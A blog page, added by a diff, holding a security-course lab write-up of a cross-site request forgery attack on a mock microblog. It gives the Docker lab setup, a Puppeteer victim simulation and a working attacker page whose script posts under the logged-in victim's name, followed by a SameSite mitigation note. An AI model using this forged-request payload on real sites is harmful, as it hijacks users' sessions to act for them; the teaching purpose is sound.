@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html style="height: 100%;" lang="en">
+  <head>
+    <title>reo</title>
+<meta name="description" content="Leop homepage">
+
+<meta property="og:title" content="reo">
+<meta property="og:description" content="Leop homepage">
+
+<!-- <meta property="fb:app_id" content="260132667518211"> -->
+<!-- <link rel="apple-touch-icon" href="https://aidn.jp/apple-touch-icon.png"> -->
+<!-- <link rel="shortcut icon" href="https://aidn.jp/shared/icon/favicon.ico"> -->
+<!-- <link rel="alternate" media="handheld" href="https://aidn.jp/"> -->
+<!--
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://aidn.jp/shared/img/og/aidn.png">
+<meta name="twitter:site" content="@daniwell_aidn">
+
+<meta property="og:image" content="https://aidn.jp/shared/img/og/aidn.png">
+
+
+<link href='https://fonts.googleapis.com/css?family=PT+Sans:400,700,400italic,700italic|Source+Sans+Pro:400,700,200,300|Josefin+Sans:400,600,700,300' rel='stylesheet' type='text/css'>
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+
+<link rel="canonical" href="http://192.168.0.23:4000/">
+<link rel="alternate" type="application/rss+xml" title="Reo homepage" href="http://192.168.0.23:4000/feed.xml">
+-->
+
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1">
+<meta property="og:locale" content="en_CA">
+<meta property="og:type" content="website">
+
+<meta name="theme-color" content="#000">
+<link rel="stylesheet" href="/assets/css/style.css">
+
+
+
+
+  </head>
+  <body style="position: relative; min-height: 100%; top: 0px;" class="dark ">
+    <nav id="nav_hp" class="sidenav collapse invert-color">
+  <!-- close button div
+  <div id="menu" style="display:block; width:100%">
+    <a href="javascript:void(0)" class="closebtn hide-large"
+				 style="line-height: 0.35; font-size:5.5vmax; margin-left:calc(6rem + 20vmin - 13vmax)"
+				 onclick="close_nav()">&times;</a>
+  </div>
+  -->
+  <!-- items div -->
+  <div id="menu" class="sidenav-items" style="display:block; width:100%">
+  
+  <p><a href="/" >TOP</a></p>
+  
+  <p><a href="/about.html" >ABOUT</a></p>
+  
+  <p><a href="/blog.html" >BLOG</a></p>
+  
+  </div>
+</nav>
+<div class="overlay hide-large" onclick="close_nav()" style="cursor:pointer"
+				title="close side menu" id="overlay"></div>
+<span class="hide-large" style="font-size:30px; cursor:pointer; position:fixed; top:3vh; left:1.2vw" onclick="open_nav()">&#9776;</span>
+<script>
+	// Open and close sidebar
+	function open_nav() {
+		document.getElementById("nav_hp").style.width = "calc(6rem + 20vmin)";
+		document.getElementById("overlay").style.display = "block";
+	}
+	function close_nav() {
+		document.getElementById("nav_hp").style.width = "0px";
+		document.getElementById("overlay").style.display = "none";
+	}
+</script>
+<!--
+	<p><a href="http://192.168.0.52:4000">TOP</a></p>
+
+	
+	
+	
+	
+	
+	
+	
+	
+	
+-->
+
+    <div class="hp-contents">
+      <h2 class="title">CSRF</h2>
+      <div class="-container">
+        <div class="-content focus-content">
+
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="post-content" itemprop="articleBody">
+    <p>An example of a cross-site request forgery <a href="https://owasp.org/www-community/attacks/csrf">(CSRF)</a>
+attack on our artificial microblog webapp.</p>
+
+<h2 class="no_toc" id="contents">Contents</h2>
+
+<ul id="markdown-toc">
+  <li><a href="#setup" id="markdown-toc-setup">Setup</a></li>
+  <li><a href="#overview" id="markdown-toc-overview">Overview</a></li>
+  <li><a href="#the-attack" id="markdown-toc-the-attack">The Attack</a></li>
+  <li><a href="#conclusions" id="markdown-toc-conclusions">Conclusions</a>    <ul>
+      <li><a href="#credits" id="markdown-toc-credits">Credits</a></li>
+    </ul>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="setup">Setup</h2>
+
+<hr />
+
+<p>Our network this time around again uses our small mock webapp</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">version</span><span class="pi">:</span> <span class="s1">'</span><span class="s">3'</span>
+
+<span class="na">services</span><span class="pi">:</span>
+  <span class="na">microblog</span><span class="pi">:</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
+    <span class="na">container_name</span><span class="pi">:</span> <span class="s">microblog</span>
+    <span class="na">ports</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">8080:80"</span>
+    <span class="na">networks</span><span class="pi">:</span>
+      <span class="na">channel</span><span class="pi">:</span>
+        <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.0.2</span>
+        
+  <span class="na">alice</span><span class="pi">:</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
+    <span class="na">container_name</span><span class="pi">:</span> <span class="s">alice</span>
+    <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
+    <span class="na">shm_size</span><span class="pi">:</span> <span class="s1">'</span><span class="s">1gb'</span>
+    <span class="na">sysctls</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="s">net.ipv6.conf.all.disable_ipv6=1</span>
+    <span class="na">networks</span><span class="pi">:</span>
+      <span class="na">channel</span><span class="pi">:</span>
+        <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.0.3</span>
+        
+  <span class="na">mallory</span><span class="pi">:</span>
+      <span class="na">image</span><span class="pi">:</span> <span class="s">nginx</span>
+      <span class="na">container_name</span><span class="pi">:</span> <span class="s">mallory</span>
+      <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
+      <span class="na">ports</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="s2">"</span><span class="s">8081:80"</span>
+      <span class="na">volumes</span><span class="pi">:</span>
+          <span class="pi">-</span> <span class="s">.:/usr/share/nginx/html:ro</span>
+      <span class="na">networks</span><span class="pi">:</span>
+        <span class="na">channel</span><span class="pi">:</span>
+          <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.0.4</span>
+      
+  <span class="na">wireshark</span><span class="pi">:</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
+    <span class="na">container_name</span><span class="pi">:</span> <span class="s">wireshark</span>
+    <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
+    <span class="na">network_mode</span><span class="pi">:</span> <span class="s">service:alice</span>
+
+<span class="na">networks</span><span class="pi">:</span>
+  <span class="na">channel</span><span class="pi">:</span>
+    <span class="na">driver</span><span class="pi">:</span> <span class="s">bridge</span>
+    <span class="na">ipam</span><span class="pi">:</span>
+      <span class="na">config</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="na">subnet</span><span class="pi">:</span> <span class="s">10.0.0.0/24</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="overview">Overview</h2>
+
+<hr />
+
+<p>The high-level overview of CSRF is using cookies in a way not intended in order to hijack
+session information or possibly send requests which were unsolicited by the user. In
+other words.</p>
+
+<ol>
+  <li>the attacker creates a malicious webpage embedding a piece of javascript code that performs a cross-domain ajax request with credentials to the vulnerable website</li>
+  <li>the victim logs in to the vulnerable website and later on browses the attacker’s malicious webpage executing the request with the victim’s credentials</li>
+</ol>
+
+<p>The exploit then takes advantage of vulnerabilities present in cross-origin requests.
+More precisely, it allows a malicious actor to perform unexpected and unwanted actions
+for an authenticated target.</p>
+
+<p>It is facilitated due to <a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing">Cross-origin resource sharing</a>
+which allows resources on a web page to be requested from
+a different domain than the one the content was first served.</p>
+
+<p>We simulate Alice navigating to Mallory’s site using <a href="https://github.com/puppeteer/puppeteer">Puppeteer</a></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">puppeteer</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">puppeteer</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="kd">const</span> <span class="nx">TIMEOUT</span> <span class="o">=</span> <span class="mi">3000</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">ALICE</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://10.0.0.2/</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">MALLORY</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://10.0.0.4/</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="kd">const</span> <span class="nx">credentials</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="dl">'</span><span class="s1">email</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">alice@example.com</span><span class="dl">'</span><span class="p">,</span>
+    <span class="dl">'</span><span class="s1">password</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">pass4alice!</span><span class="dl">'</span>
+<span class="p">};</span>
+
+<span class="p">(</span><span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">browser</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span>
+            <span class="na">args</span><span class="p">:</span> <span class="p">[</span>
+                <span class="dl">'</span><span class="s1">--no-sandbox</span><span class="dl">'</span><span class="p">,</span>
+                <span class="dl">'</span><span class="s1">--disable-setuid-sandbox</span><span class="dl">'</span><span class="p">,</span>
+                <span class="dl">'</span><span class="s1">--enable-logging</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">--v=1</span><span class="dl">'</span>
+            <span class="p">]</span>
+    <span class="p">});</span>
+    <span class="kd">let</span> <span class="nx">page</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Alice visits Microblog homepage</span><span class="dl">'</span><span class="p">);</span>
+    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">goto</span><span class="p">(</span><span class="nx">ALICE</span><span class="p">);</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Alice logs in Microblog</span><span class="dl">'</span><span class="p">);</span>
+    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">(</span><span class="k">async</span> <span class="p">(</span><span class="nx">credentials</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">form</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FormData</span><span class="p">();</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">credentials</span><span class="p">){</span>
+             <span class="nx">form</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">credentials</span><span class="p">[</span><span class="nx">key</span><span class="p">]);</span>
+        <span class="p">}</span>
+        <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">/signin.php</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
+            <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
+            <span class="na">body</span><span class="p">:</span> <span class="nx">form</span><span class="p">,</span>
+        <span class="p">});</span>
+    <span class="p">},</span> <span class="nx">credentials</span><span class="p">);</span>
+    <span class="k">await</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">){</span>
+        <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span> <span class="nx">resolve</span><span class="p">();</span> <span class="p">},</span> <span class="nx">TIMEOUT</span><span class="p">);</span>
+    <span class="p">});</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Alice visits Mallory</span><span class="se">\'</span><span class="s1">s homepage</span><span class="dl">'</span><span class="p">);</span>
+    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">goto</span><span class="p">(</span><span class="nx">MALLORY</span><span class="p">);</span>
+    <span class="k">await</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">){</span>
+        <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span> <span class="nx">resolve</span><span class="p">();</span> <span class="p">},</span> <span class="nx">TIMEOUT</span><span class="p">);</span>
+    <span class="p">});</span>
+    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+    <span class="k">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+<span class="p">})();</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="the-attack">The Attack</h2>
+
+<hr />
+
+<p>Mallory simply needs to host a web server does the desirable action for an authenticated user which visits their webpage.
+Suppose Mallory wants to post <em>Mallory is a trustworthy person!</em> in place of any authenticated user which
+visits this page, the simplest way to achieve this would be to include a js script which does the
+corresponding request. The page could be as simple as</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+  <span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Mallory's home!<span class="nt">&lt;/title&gt;</span>
+  <span class="nt">&lt;/head&gt;</span>
+  <span class="nt">&lt;body&gt;</span>
+     <span class="nt">&lt;p&gt;</span>Thank you!<span class="nt">&lt;/p&gt;</span>
+     <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"exploit.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+  <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>From our investigation in the <a href="">incomplete mediation</a>
+exercise, we know exectly what the request we want looks like.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">MICROBLOG</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">10.0.0.2</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">PROTOCOL</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">HOST</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">10.0.0.2</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">PORT</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">8080</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">BASE</span> <span class="o">=</span> <span class="nx">PROTOCOL</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">://</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">MICROBLOG</span><span class="p">;</span>
+
+<span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="nx">BASE</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/post.php</span><span class="dl">"</span><span class="p">;</span>
+
+ <span class="nx">fetch</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="p">{</span>
+    <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
+    <span class="na">credentials</span><span class="p">:</span> <span class="dl">"</span><span class="s2">include</span><span class="dl">"</span><span class="p">,</span>
+   <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
+      <span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">,</span>
+      <span class="dl">'</span><span class="s1">Connection</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">keep-alive</span><span class="dl">'</span>
+    <span class="p">},</span>
+    <span class="na">body</span><span class="p">:</span> <span class="dl">"</span><span class="s2">msg=Mallory+is+a+trustworthy+person!</span><span class="dl">"</span> <span class="c1">// body data type must match "Content-Type" header</span>
+ <span class="p">});</span>
+</code></pre></div></div>
+
+<p>now when Alice “navigates” to Mallory’s page while logged in</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker exec alice node /app/browse.js
+</code></pre></div></div>
+
+<p>we see in our microblog a post which says <em>Mallory is a trustworthy person!</em> under her name
+as we expected.</p>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="conclusions">Conclusions</h2>
+
+<hr />
+
+<p>OWASP publishes a <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">CSRF Prevention Cheat Sheet</a>
+but one way to help mitigate the attack we use here is setting the <code class="language-plaintext highlighter-rouge">SameSite</code> flag on the
+authentication cookie so it cannot be used from an uninteded third-party site.</p>
+
+<p>When you’re done, don’t forget to <a href="/crypto/2020/10/08/05-lab.html#docker-cleanup">clean up</a>
+after Docker.</p>
+
+<hr />
+
+<h3 id="credits">Credits</h3>
+
+<hr />
+
+<p>These labs and exercises were provided as a part of a course in Security
+taught in 2019 by
+<a href="https://thierrysans.me/">Thierry Sans</a>.
+Credit for creation of these exercises and
+Docker images/containers goes to their respective creators.</p>
+
+<p>Docker images, urls, etc. are kept private
+to prevent abuse but if interested please
+contact.</p>
+
+
+  </div>
+</article>
+
+
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
